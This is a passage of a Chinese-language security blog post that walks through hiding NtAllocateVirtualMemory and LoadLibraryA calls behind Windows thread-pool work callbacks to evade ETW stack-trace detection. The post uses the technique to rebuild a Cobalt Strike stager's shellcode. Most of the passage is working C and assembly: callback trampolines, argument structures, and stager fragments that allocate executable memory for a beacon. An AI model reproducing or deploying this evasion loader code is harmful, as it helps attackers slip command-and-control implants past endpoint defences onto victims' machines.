    typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
        UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
        HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
        PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
        PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
        ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
    } NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;
    extern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    int main() {
        LPVOID allocatedAddress = NULL;
        SIZE_T allocatedsize = 0x1000;
        NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
        ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
        ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
        ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
        ntAllocateVirtualMemoryArgs.size = &allocatedsize;
        ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READ;
        FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
        FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
        FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");
        PTP_WORK WorkReturn = NULL;
        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, &ntAllocateVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("allocatedAddress: %p\n", allocatedAddress);
        getchar();
        return 0;
    }
在之前处理 LoadLibraryA 函数时，为了能够构造 PTP_WORK_CALLBACK 类型的函数结构并将正确的参数传递给 LoadLibraryA
函数，我们编写了一些汇编代码将 RDX 寄存器中的存储的参数转移到了 RCX 寄存器中，而此处的 NtAllocateVirtualMemory
函数有6个参数，这些参数在传递时不仅使用了寄存器，还需要使用堆栈进行传参。我们的 WorkCallback 本质上是通过另一个函数
TppWorkpExecuteCallback 进行调用的，此时的堆栈顶部会保存该函数的返回地址：
如果我们此时修改堆栈顶部的内容，将 NtAllocateVirtualMemory 函数的参数分配新的空间到栈中，会破坏这个堆栈结构，从而导致
WorkCallback 函数无法正常返回，所以我们不能改变现有的堆栈结构，同时又将 NtAllocateVirtualMemory
参数的值保存到这个堆栈结构中，恰好当前 TppWorkpExecuteCallback 函数的堆栈结构有足够的空间容纳
NtAllocateVirtualMemory 函数的参数，作者给出的汇编代码：
    section .text
    global WorkCallback
    WorkCallback:
        mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]              ; NtAllocateVirtualMemory
        mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
        mov rdx, [rbx + 0x10]       ; PVOID *BaseAddress
        xor r8, r8                  ; ULONG_PTR ZeroBits
        mov r9, [rbx + 0x18]        ; PSIZE_T RegionSize
        mov r10, [rbx + 0x20]       ; ULONG Protect
        mov [rsp+0x30], r10         ; stack pointer for 6th arg
        mov r10, 0x3000             ; ULONG AllocationType
        mov [rsp+0x28], r10         ; stack pointer for 5th arg
        jmp rax
调用 NtAllocateVirtualMemory 时寄存器和堆栈情况：
此时 NtAllocateVirtualMemory 在堆栈调用关系上与我们的 shellcode 区域没有明显的关联：
## 4\. 构建 Shellcode
Shellcode 的编写方法我在 [CS 4.7 Stager 逆向及 Shellcode 重写 -先知社区](https://xz.aliyun.com/t/12194) 已经做了介绍，这里不再赘述。
替换 LoadLibraryA 进行模块加载：
    /* Load User32.dll */
    ai.pfnTpAllocWork(&LoadUser32, (PTP_WORK_CALLBACK)myLoadLibrary, (PVOID)szUser32, NULL);
    ai.pfnTpPostWork(LoadUser32);
    ai.pfnTpReleaseWork(LoadUser32);
    /* Load Wininet.dll */
    ai.pfnTpAllocWork(&LoadWininet, (PTP_WORK_CALLBACK)myLoadLibrary, (PVOID)szWininet, NULL);
    ai.pfnTpPostWork(LoadWininet);
    ai.pfnTpReleaseWork(LoadWininet);
替换 VirtualAlloc 分配内存空间：
    /* Allocate Memory For URL */
    ntAllocateVirtualMemoryUrlArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddressWithHash(0x9488B12D);
    ntAllocateVirtualMemoryUrlArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryUrlArgs.address = &httpurl;
    ntAllocateVirtualMemoryUrlArgs.size = &allocatedurlsize;
    ntAllocateVirtualMemoryUrlArgs.permissions = PAGE_READWRITE;
    ai.pfnTpAllocWork(&AllocUrl, (PTP_WORK_CALLBACK)myNtAllocateVirtualMemory, &ntAllocateVirtualMemoryUrlArgs, NULL);
    ai.pfnTpPostWork(AllocUrl);
    ai.pfnTpReleaseWork(AllocUrl);
    /* Allocate Memory For Beacon */
    ntAllocateVirtualMemoryBeaconArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddressWithHash(0x9488B12D);
    ntAllocateVirtualMemoryBeaconArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryBeaconArgs.address = &beacon;
    ntAllocateVirtualMemoryBeaconArgs.size = &allocatedbeaconsize;
    ntAllocateVirtualMemoryBeaconArgs.permissions = PAGE_EXECUTE_READWRITE;
    ai.pfnTpAllocWork(&AllocBeacon, (PTP_WORK_CALLBACK)myNtAllocateVirtualMemory, &ntAllocateVirtualMemoryBeaconArgs, NULL);
    ai.pfnTpPostWork(AllocBeacon);
    ai.pfnTpReleaseWork(AllocBeacon);
回调函数的汇编代码：
    EXTRN   getLoadLibraryA: PROC
    PUBLIC  myLoadLibrary
    PUBLIC  myNtAllocateVirtualMemory
    _TEXT   SEGMENT
    myLoadLibrary PROC
        movq xmm3, rdx
        xor rdx, rdx
        call getLoadLibraryA
        movq rcx, xmm3
        xorps xmm3, xmm3
        jmp rax
    myLoadLibrary ENDP
    myNtAllocateVirtualMemory PROC
        mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]              ; NtAllocateVirtualMemory
        mov rcx, [rbx + 8h]        ; HANDLE ProcessHandle
        mov rdx, [rbx + 10h]       ; PVOID *BaseAddress
        xor r8, r8                  ; ULONG_PTR ZeroBits
        mov r9, [rbx + 18h]        ; PSIZE_T RegionSize
        mov r10, [rbx + 20h]       ; ULONG Protect
        mov [rsp+30h], r10         ; stack pointer for 6th arg
        mov r10, 3000h             ; ULONG AllocationType
        mov [rsp+28h], r10         ; stack pointer for 5th arg
        jmp rax
    myNtAllocateVirtualMemory ENDP
    _TEXT   ENDS
    END
将汇编部分编译成 obj 文件，然后在项目属性链接器部分将其作为附加依赖项：
需要注意的是，项目属性要禁用优化或者改为优化速度，否则编译的 shellcode
无法正常运行（这里我也不清楚原因，有知道的师傅还请指教下），这也导致提取出来的 shellcode 比之前的大了一倍多：
提取 shellcode，使用一个简单的加载器测试上线：
完整 demo（写的比较粗糙）：
## 5\. 参考链接
[Hiding In PlainSight - Proxying DLL Loads To Hide From ETWTI Stack
Tracing](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/)
[Hiding In PlainSight - Indirect Syscall is Dead! Long Live Custom Call
Stacks](https://0xdarkvortex.dev/hiding-in-plainsight/)
[WorkCallback callback function (Windows)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms687396\(v=vs.85))